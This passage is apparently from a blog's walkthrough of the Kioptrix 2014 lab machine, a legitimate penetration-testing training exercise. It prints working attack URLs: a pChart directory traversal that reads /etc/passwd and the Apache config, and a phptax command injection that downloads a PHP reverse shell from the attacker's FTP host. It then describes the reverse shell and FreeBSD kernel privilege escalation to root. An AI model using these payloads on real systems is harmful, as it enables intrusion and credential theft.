<li><a href="https://www.exploit-db.com/exploits/26368/">FreeBSD 9.0-9.1 mmap/ptrace - Privilege Esclation Exploit</a></li>
<li><a href="https://www.exploit-db.com/exploits/28718/">FreeBSD 9.0 - Intel SYSRET Kernel Privilege Escalation Exploit</a></li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [Net Discover]</li>
<li>Port scanned the target to discover the running services and open ports [nmap]</li>
<li>Web information gathering and interacting with the web server [firefox, wappalyzer addon]</li>
<li>Exploit Remote Code Execution and upload reverse php webshell [php-reverse-shell]</li>
<li>Exploit local privilege escalation to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://nixgeneration.com/~jaime/netdiscover/">netdiscover</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a></li>
</ul>


<h2>Walkthrough</h2>

<p>I use netdiscover as routine to detect the target&rsquo;s IP address and then run NMAP scan to detect opening ports/running services on the target. From the result, TCP port 80 and 8080 have been discovered and the web server is <font color="red">apache 2.2.21</font> running on <font color="red">FreeBSD system</font>.</p>

<p>Fire up NIKTO for web scanning but did not get much interesting results. Trying to access port 8080 from my FIREFOX browser but the access has been forbidden. So I turn to access port 80 on firefox. This time, it shows classic &ldquo;It works!&rdquo; page. After checking the source code, I found something interesting(hidden URL) in comments:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;!--  &lt;META HTTP-EQUIV="refresh" CONTENT="5;URL=pChart2.1.3/index.php">  -->
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure>
Looks like web application &ldquo;pChart version 2.1.3&rdquo; is running, so I searched &ldquo;pChart2.1.3 exploit&rdquo; in google and found &ldquo;<a href="https://www.exploit-db.com/exploits/31173/">Directory Traversal and Reflected XSS Vulnerability</a>&rdquo;.</p>

<p>By exploiting the &ldquo;Directory Traversal&rdquo; vulnerability, I can read some system files, such as <code>/etc/passwd</code> and apache configuration file <code>/usr/local/etc/apache22/httpd.conf</code> (note: this is <a href="https://www.freebsd.org/doc/handbook/network-apache.html">apache configuration file location in FreeBSD</a>, which is different from other Linux systems)</p>

<p>PoC:</p>

<p><code>http://10.10.10.132/pChart2.1.3/examples/index.php?Action=View&amp;Script=../../../../../../../etc/passwd</code></p>

<p><code>http://10.10.10.132/pChart2.1.3/examples/index.php?Action=View&amp;Script=../../../../../../../usr/local/etc/apache22/httpd.conf</code></p>

<p>From apache configuration file, I found the following configuration in the end of the file:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="ni">&amp;lt;</span>VirtualHost *:8080&gt;
</span><span class='line'>    DocumentRoot /usr/local/www/apache22/data2<span class="nt">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="nt">&lt;p&gt;</span><span class="ni">&amp;lt;</span>Directory &quot;/usr/local/www/apache22/data2&quot;&gt;
</span><span class='line'>    Options Indexes FollowSymLinks
</span><span class='line'>    AllowOverride All
</span><span class='line'>    Order allow,deny
</span><span class='line'>    Allow from env=Mozilla4_browser
</span><span class='line'><span class="nt">&lt;/Directory&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Here is the key to open port 8080, I changed the user-agent header to <code>Mozilla/4.0</code> (anything start with this string should bypass) by using Firefox addons <a href="https://addons.mozilla.org/En-us/firefox/addon/user-agent-switcher/">User Agent Switcher</a>.</p>

<p>After access 8080 again with new User-Agent Header, I found the web application &ldquo;phptax&rdquo; in URL: <code>http://10.10.10.132:8080/phptax/</code>. Then I searched &ldquo;phptax exploit&rdquo; in google and found the <a href="https://www.exploit-db.com/exploits/21665/">Remote Code Execution vulnerability</a>.</p>

<p>Due to this is FreeBSD system (the OSCP studying experences very helpful here :P), the nc reverse shell could not work, so I have to find other ways. I set up <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a> and FTP server on my Kali, then exploit remote code execution vulnerability to upload my php reverse shell (sh.php) to the target.</p>

<p>PoC:</p>

<p><code>http://10.10.10.132:8080/phptax/index.php?pfilez=1040d1-pg2.tob;ftp -4 -d -v ftp://offsec:offsec@10.10.10.131//sh.php;&amp;pdf=make</code></p>

<p>* <font color="red">Note</font>: There are other methods can be used to upload php reverse shell, for example, using NC. Please check other walkthroughs from the vulnhub <a href="https://www.vulnhub.com/entry/kioptrix-2014-5,62/#walkthrough">link</a></p>

<p>Then I set up NC to listen on port 5555 and access the URL <code>http://10.10.10.132:8080/phptax/sh.php</code> to trigger the reverse shell connect back to my NC.</p>

<p><img class="left" src="/downloads/kioptrix2014/1.png"></p>

<p>* <font color="red">Note</font>: Metasploit framework also provides an automatic exploit method: &ldquo;<strong><em>exploit/multi/http/phptax_exec</em></strong>&rdquo;</p>

<p><img class="left" src="/downloads/kioptrix2014/2.png"></p>

<p>Now, I have already got in with limited privilege. After some local enumeration, I searched &ldquo;freebsd 9 exploit&rdquo; in google and found two working exploits:</p>

<ul>
<li><a href="https://www.exploit-db.com/exploits/26368/">FreeBSD 9.0-9.1 mmap/ptrace - Privilege Esclation Exploit</a></li>
<li><a href="https://www.exploit-db.com/exploits/28718/">FreeBSD 9.0 - Intel SYSRET Kernel Privilege Escalation Exploit</a></li>
</ul>


<p>After upload any one of the exploits, compiled with gcc and run it to get ROOT.</p>

<p><img class="left" src="/downloads/kioptrix2014/3.png"></p>

<p><img class="left" src="/downloads/kioptrix2014/4.png"></p>
]]></content>
  </entry>
  
</feed>
